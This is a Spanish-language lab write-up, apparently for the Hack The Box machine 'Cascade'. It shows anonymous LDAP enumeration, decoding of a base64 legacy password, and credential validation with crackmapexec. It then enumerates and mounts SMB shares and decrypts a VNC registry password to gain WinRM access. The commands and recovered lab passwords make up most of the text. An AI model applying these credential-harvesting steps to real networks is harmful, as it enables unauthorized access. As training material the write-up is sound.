## Vulnerability Assessment {-}

### ldapsearch {-}

Como el ldap esta disponibles, usamos **ldapsearch** para enumerar el LDAP.

```bash
ldapsearch -x -h 10.10.10.182 -b "dc=cascade,dc=local"
```

Como la enumeracion es muy grande, buscamos emails

```bash
ldapsearch -x -h 10.10.10.182 -b "dc=cascade,dc=local" | grep "@cascade.local"
```

Miramos por cada uno de estos usuarios encontrados si hay informaciones relevantes por cada uno de ellos mirando las 20 lineas que hay debajo
del grep

```bash
ldapsearch -x -h 10.10.10.182 -b "dc=cascade,dc=local" | grep "@cascade.local -A 20
```

Debajo del usuario **r.thompson** vemos un cascadeLegacyPwd en base64

```bash
echo "clk0bjVldmE=" | base64 -d; echo
```

Tiene pinta de ser una contraseña.

Validamos el usuario con crackmapexec

```bash
crackmapexec smb 10.10.10.182 -u "r.thompson" -p "rY4n5eva"
```

Vemos que este usuario es valido pero no nos da un **Pwn3d!**. Miramos si podemos connectar por WinRM

```bash
crackmapexec winrm 10.10.10.182 -u "r.thompson" -p "rY4n5eva"
```

pero no.

Miramos Si tenemos accesso a directorio compartidos a nivel de red

```bash
smbmap -H 10.10.10.182 -u 'r.thompson' -p 'rY4n5eva'
```

podemos ver recursos como:

- Data
- NETLOGON
- print$
- SYSVOL

Creamos una montura contra el directorio `Data`

```bash
mkdir /mnt/smbmounted
mount -t cifs //10.10.10.182/Data /mnt/smbmounted -o username=r.thompson,password=rY4n5eva,domain=cascade.local,rw
cd /mnt/smbmounted
tree
```

Vemos un fichero `Meeting_Notes_June_2018.html` y lo analyzamos desde un servidor web

```bash
cd /var/www/html
cp /mnt/smbmounted/IT/Email\ Archives/Meeting_Notes_June_2018.html index.html
service apache2 start
```

Y lo miramos desde firefox en localhost. Y vemos un email escrito por Steve (s.smith) que nos dice que hay una cuenta temporar 
llamada TempAdmin que a sido creada para manejar migraciones y que esta cuenta tiene la misma contraseña que el usuario admin.

Mirando los otros ficheros, vemos un `VNC Install.reg`.

```bash
file VNC\ Install.reg
cat VNC\ Install.reg
```

Aqui podemos ver una contraseña en hexadecimal

```bash
echo "6b,cf,2a,4b,6e,5a,ca,0f" | tr -d ','
echo "6b,cf,2a,4b,6e,5a,ca,0f" | tr -d ',' | xxd -ps -r
echo "6b,cf,2a,4b,6e,5a,ca,0f" | tr -d ',' | xxd -ps -r > pass
cat password
```

Vemos que el contenido esta encryptado. Buscamos por internet si existe un decrypter para contraseñas de VNC

```bash
git clone https://github.com/jeroennijhof/vncpwd
cd vncpwd
make
make install
upx
./vncpwd password
```

Aqui vemos la contraseña. Lo validamos con crackmapexec

```bash
crackmapexec smb 10.10.10.182 -u "s.smith" -p "sT333ve2"
crackmapexec winrm 10.10.10.182 -u "s.smith" -p "sT333ve2"
```

El usuario es validado y ademas tiene un **Pwn3d!** en el winrm.
